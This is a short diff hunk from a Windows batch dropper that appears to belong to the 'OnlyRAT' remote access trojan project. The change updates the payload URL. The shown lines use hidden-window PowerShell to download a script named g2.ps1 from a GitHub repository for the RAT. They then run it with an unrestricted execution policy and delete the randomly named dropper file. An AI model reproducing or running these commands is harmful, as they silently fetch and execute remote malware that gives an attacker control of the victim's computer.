@@ -25,6 +25,6 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
-powershell.exe -windowstyle hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/g2.ps1 -OutFile KFPGaEYdcz.ps1
+powershell.exe -windowstyle hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/CosmodiumCS/MK01-OnlyRAT/main/payloads/g2.ps1 -OutFile KFPGaEYdcz.ps1
 powershell.exe -windowstyle hidden -ep unrestricted ./KFPGaEYdcz.ps1
 del wEaoFkNduy.cmd
